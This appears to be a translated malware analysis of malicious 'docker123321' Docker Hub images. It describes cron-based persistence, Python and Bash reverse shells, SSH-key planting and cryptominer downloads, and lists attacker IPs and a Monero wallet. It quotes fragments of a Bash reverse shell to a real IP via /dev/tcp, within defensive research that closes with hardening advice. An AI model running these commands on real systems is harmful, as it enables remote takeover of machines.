docker123321/mysql5
|
2018-02-05 14:05:18  
docker123321/mysql6
|
2018-02-07 02:16:29  
在2017年7月和8月分别创建了三个恶意的docker镜像：
l docker123321/tomcat
l docker123321/tomcat11
l docker123321/tomcat22
我们使用CLI使用“$ docker inspect docker123321/tomcat”检查了docker映像：
图7\. CLI命令的输出
事实证明，该镜像运行一个包含一系列命令的shell脚本：
l 将/ etc /从主机文件系统挂载到/ mnt / etc /内部，以便将它写入主机上/ etc下的文件。
l 在主机上添加新的cronjob到/ etc / crontab。它允许攻击者获得对受害者系统的持久性。
l Cronjob每分钟运行一次，并执行Python反向
Shell，这会为攻击者提供受害者机器上的交互式shell。攻击者在服务器端写入的所有内容都通过套接字发送。然后受害者的系统会像命令一样在子进程中执行它。
想象一下，一个没有经验的用户提取docker123321 /
tomcat这样的镜像。即使用户意识到镜像不是它所代表的内容，并试图将其从系统中删除，用户也很容易被黑客攻击。
此镜像与以前的恶意shell脚本类似，因为它也：
l 向主机上的/ etc / crontab添加一个新条目以执行有效载荷
图8.“$ docker inspect docker123321 / tomcat11”CLI命令的输出
与前面的示例不同的是，这个shell脚本运行的是Bash反向Shell，它执行以下操作：
l 使受害者机器连接到控制服务器，然后将会话转发给它。
l 命令bash -i>＆用“交互式（interactive）”选项调用bash。
l 然后/dev/tcp/98.142.140.13/3333通过设备文件将该会话重定向到TCP套接字。Linux已经构建了一个/ dev /
device文件。
l 这个内置的设备文件允许bash直接连接到任何IP和任何TCP端口
l 最后0>＆1接收标准输出，并将其连接到标准输入。
我们意识到，当容器在受害者的机器上运行时，它将使攻击者控制远程命令执行的机器。
图9.“$ docker inspect docker123321 / tomcat22”CLI命令的输出
在这里，我们找到了一个shell脚本，它的作用如下：
l 将/root/.ssh/从主机文件系统挂载到容器内的/mnt/root/.ssh/，以便将其写入主机上/root/.ssh/下的文件。
l 将SSH密钥添加到主机上的/root/.ssh/authorized_keys文件。它的目的是提供访问，而不需要为每次登录设置密码。
一旦完成，它授予攻击者对受害者机器的完全控制。赚取利润就像在一个受损系统上注入勒索软件或在受损系统上进行挖掘一样简单。
2017年10月：添加了2个新的恶意镜像：
l docker123321/kk
l docker123321/mysql
图10.“$ docker inspect docker123321 / kk”CLI命令的输出
检查显示以下行为：
l 首先，它在主机/ etc目录下添加一个新的crontab条目。
l Cronjob每分钟运行一次，并使系统工具curl下载test44.sh。
图11\. test44.sh
l test44.sh bash脚本文件包含启动5个加密采矿bitnn / alpine- xmrig容器的命令序列，这些容器连接到crypto-pool.fr采矿池。
犯罪分子的门罗币钱包出现在bash脚本中——41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo
图12.犯罪分子的门罗币钱包
支付金额为544.74 XMR，相当于89097.67美元。这里有很高的可能性，这近9万美元是通过使用加密挖掘容器污染云环境赚取来的。
在docker123321/mysql中实现了一个类似的算法：
图13.“$ docker inspect docker123321 / mysql”CLI命令的输出
当容器运行时，将发生以下情况：
l 首先，它在主机/ etc目录下添加新的crontab条目。
l Cronjob每分钟运行一次，并使系统工具curl下载logo3.jpg，这实际上是一个bash脚本。
l 该脚本包含一系列命令，可以在受害者的机器上启动挖掘软件。
fortinet.com早前已经对docker123321/cron的test44.sh和相同的恶意logo1.jpg进行了[详细的研究](https://www.fortinet.com/blog/threat-research/yet-another-crypto-mining-botnet.html)。
研究表明，docker123321镜像可以分为五类。
Docker镜像名称
|
恶意软件的类型  
---|---  
docker123321/tomcat
docker123321/mysql2
docker123321/mysql3
docker123321/mysql4
docker123321/mysql5
docker123321/mysql6
|
容器运行Python反向Shell  
docker123321/tomcat11
|
容器运行Bash反向Shell  
docker123321/tomcat22
|
容器添加攻击者的SSH密钥  
docker123321/cron
docker123321/cronm
docker123321/cronnn
docker123321/mysql
docker123321/mysql0
docker123321/data
docker123321/t1
docker123321/t2
|
容器运行嵌入式加密货币矿工。
（在容器运行的情况下，它将下载恶意的.jpg文件，该文件在bash中运行并公开挖掘软件。）  
docker123321/kk
|
容器运行嵌入式加密货币矿工
（在容器运行的情况下，它将下载恶意的.sh文件，该文件在在bash中运行并公开挖掘软件。）  
表1\. Python反向Shell和嵌入式加密货币矿工持有大部分镜像
Docker镜像名称
|
镜像中使用的IP地址  
---|---  
docker123321/cron
docker123321/cronm
|
162.212.157.244  
docker123321/mysql
|
104.225.147.196  
docker123321/mysql0
|
128.199.86.57  
docker123321/mysql2
docker123321/mysql3
docker123321/mysql4
docker123321/mysql5
docker123321/mysql6
|
45.77.24.16  
docker123321/data
|
142.4.124.50  
docker123321/kk
|
198.181.41.97  
docker123321/tomcat
docker123321/tomcat11
|
98.142.140.13  
docker123321/cronnn
|
67.231.243.10  
docker123321/t1
docker123321/t2
|
185.82.218.206  
表2.攻击者使用9个IP来寻址他的远程服务器
一个简单的查找（例如67.231.243.10）显示IP被用于处理恶意软件，包括：
l [xmrig.exe](https://github.com/xmrig/xmrig) –
开源的[加密货币](https://github.com/xmrig/xmrig)挖掘工具
l .jpg文件，被混淆的恶意bash脚本
l PowerShell脚本
图14\. IP地址信息
当我们使用Shodan CLI获得最常用IP的历史视图时，我们看到以下内容：
图15\. Shodan主机信息
图16
图17
它显示了与OpenSSH、Pure-FTPd、ProFTPD和Apache HTTP
Server相关的网络服务中的许多漏洞。攻击者很有可能利用这些漏洞将远程机器变成命令和控制服务器。
## 结论
对普通用户来说，只需从DockerHub中提取一个Docker镜像，就像从任何地方提取任意二进制数据，执行它，并且希望获得最好的结果，而不必知道它里面的内容。
我们应该考虑的主要问题是可追溯性。提取Docker映像的过程必须是透明的，并且易于遵循。首先，你可以简单地尝试查看Dockerfile，以了解FROM和ENTRYPOINT符号以及容器的功能。其次，使用[Docker自动化构建](https://docs.docker.com/docker-hub/github/#automated-builds-from-github)来构建Docker镜像。这是因为，使用Docker自动构建，你可以在Dockerfile的源代码、镜像的版本和实际的构建输出之间获得可追溯性。
每一个构建的细节都显示了大量的信息，用于提高镜像的可信度：
l 使用Dockerfile从git存储库获取的SHA
l 显示执行的Dockerfile中的每条命令
l 最后，这一切都以推送的镜像摘要结束
Kubernetes的部署同和传统环境一样容易遭受来自黑客和内部人员的攻击和利用。通过攻击编排工具，黑客可以破坏正在运行的应用程序，甚至可以控制用于运行容器的底层资源。旧的安全模型和工具将无法跟上不断变化的容器环境。你需要问问自己，你是否能够监控容器或容器内发生的情况，以确定是否存在潜在的漏洞利用。特别注意最具破坏性的“杀死链”攻击——一系列的恶意活动，共同实现攻击者的目标。检测链中的事件需要多层次的安全监控。
Kubernetes集群中的内部和外部通信应被视为安全配置中最重要的部分。我们学到的关键概念是：
l 该连接不够安全，无法在internet.kubelet上运行。
l 必须使用SSH隧道将数据包安全地放到集群的网络上，而不会将kubelet的Web服务器暴露给互联网。
l kubelet需要使用由集群CA签名的证书来服务其https端点。
遵循这些原则可以帮助你获得一定程度的安全意识。
审核人：yiwang 编辑：边边